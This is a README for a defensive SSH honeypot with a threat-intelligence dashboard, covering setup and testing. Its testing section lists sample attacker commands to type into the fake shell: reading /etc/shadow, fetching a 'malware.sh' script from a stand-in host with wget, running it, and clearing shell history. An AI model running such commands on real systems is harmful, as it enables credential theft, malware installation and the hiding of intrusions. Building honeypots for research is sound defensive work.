# 🛡️ AI Honeypot Threat Intelligence System

A complete cybersecurity honeypot solution with real-time threat intelligence dashboard, built on the MERN stack architecture (MongoDB, Express/Flask, React, Node.js).

## 🎯 Overview

This project consists of four main components:

| Component       | Description                                              | Port  |
| --------------- | -------------------------------------------------------- | ----- |
| **Database**    | MongoDB server storing commands, sessions, and analytics | 27017 |
| **Honeypot**    | SSH honeypot that simulates a Linux production server    | 2222  |
| **API Server**  | Flask backend that serves live DB data to the frontend   | 5000  |
| **Dashboard**   | React frontend for visualizing threat intelligence       | 5173  |

---

## 📋 Prerequisites

- **MongoDB Server** (Community Edition or Atlas)
- **Python 3.8+**
- **Node.js 18+** with npm

---

## 🚀 Quick Start

### Step 1: Ensure MongoDB is Running

Make sure your MongoDB server is running on `mongodb://localhost:27017`.
- **Windows**: Start the "MongoDB Server (MongoDB)" service via `services.msc`.
- **macOS/Linux**: Run `mongod`.

### Step 2: Install Python Dependencies

```bash
cd Honeypot
pip install -r requirements.txt
# Or manually: pip install paramiko flask flask-cors geoip2 pymongo
```

### Step 3: Install Dashboard Dependencies

```bash
cd Honeypot/dashboard
npm install
```

---

## ▶️ Running the Project

You need **3 terminal windows** to run all components (assuming MongoDB is already running in the background):

### Terminal 1: Start the Honeypot Server

```bash
cd Honeypot
python main.py
```

Expected output:
```
[*] Loading existing host key from honeypot_host_key.pem
[*] Starting SSH Honeypot on 0.0.0.0:2222
[*] Listening for connections...
```

### Terminal 2: Start the API Server

```bash
cd Honeypot
python api_server.py
```

Expected output:
```
[*] Starting Honeypot API Server (MongoDB)...
[*] API available at http://localhost:5000
 * Running on http://127.0.0.1:5000
```

### Terminal 3: Start the Dashboard

```bash
cd Honeypot/dashboard
npm run dev
```

Expected output:
```
VITE v7.x.x ready in xxx ms
➜  Local:   http://localhost:5173/
```

---

## 🌐 Accessing the Dashboard

Open your browser and navigate to **http://localhost:5173**. 
You will see the threat dashboard with real-time metrics, live sessions, a command timeline, session replay capabilities, and a global threat map.

---

## 🧪 Testing the Honeypot

### Connect as an Attacker

Open a **4th terminal** and connect to the honeypot:

```bash
ssh -p 2222 admin@localhost
```

When prompted:
- Enter **any password** (the honeypot accepts all passwords to trap attackers).
- Type `yes` to accept the host key if warned.

### Try These Commands

Generate threat data by acting like an attacker:

```bash
# Basic reconnaissance (Low severity)
ls
pwd
whoami
uname -a

# System exploration (Medium severity)
cat /etc/passwd
ps aux
netstat -an

# Suspicious activity (High severity)
sudo -l
cat /etc/shadow
wget http://example.com/malware.sh
nohup ./malware &
history -c
exit
```

**Watch the Dashboard Update:** 
Your commands will be instantly logged to MongoDB, categorized by the AI deception engine, and reflected in real-time on the React dashboard.

---

## 📂 Project Structure

```
Honeypot/
├── main.py                  # Honeypot server entry point
├── honeypot.py              # SSH honeypot session handler
├── commands.py              # Command simulation engine
├── filesystem.py            # Virtual file system & decoying
├── deception.py             # AI-powered deception & skill analysis
├── session_recorder.py      # Session transcript compiler
├── logger.py                # Audit log generator
├── database.py              # MongoDB connection & schema manager
├── api_server.py            # Flask REST API server
├── verify_honeypot.py       # Automated testing script
├── requirements.txt         # Python dependencies
└── dashboard/               # React frontend
    ├── src/
    │   ├── components/      # Reusable UI charts and tables
    │   ├── pages/           # Dashboard views (Timeline, Replay, Map)
    │   └── services/        # API client
    └── package.json
```

---

## 🛑 Stopping the Services

Press `Ctrl+C` in each terminal to stop the corresponding service safely. MongoDB will continue running in the background unless explicitly stopped.

---

## 🔧 Troubleshooting

### Port Already in Use
```bash
# Windows
netstat -ano | findstr :2222  # Replace 2222 with the blocked port
taskkill /PID <pid> /F
```

### Database Errors
Ensure MongoDB is running locally on port `27017`. You can modify the connection string by setting the `MONGO_URI` environment variable before starting the API server and Honeypot server.

### SSH Host Key Warning
If you get "REMOTE HOST IDENTIFICATION HAS CHANGED":
```bash
ssh-keygen -R "[localhost]:2222"
```

---

## 📝 License & Disclaimer

This project is for educational and threat intelligence research purposes only. Do not deploy a honeypot on a production network without understanding the security implications.
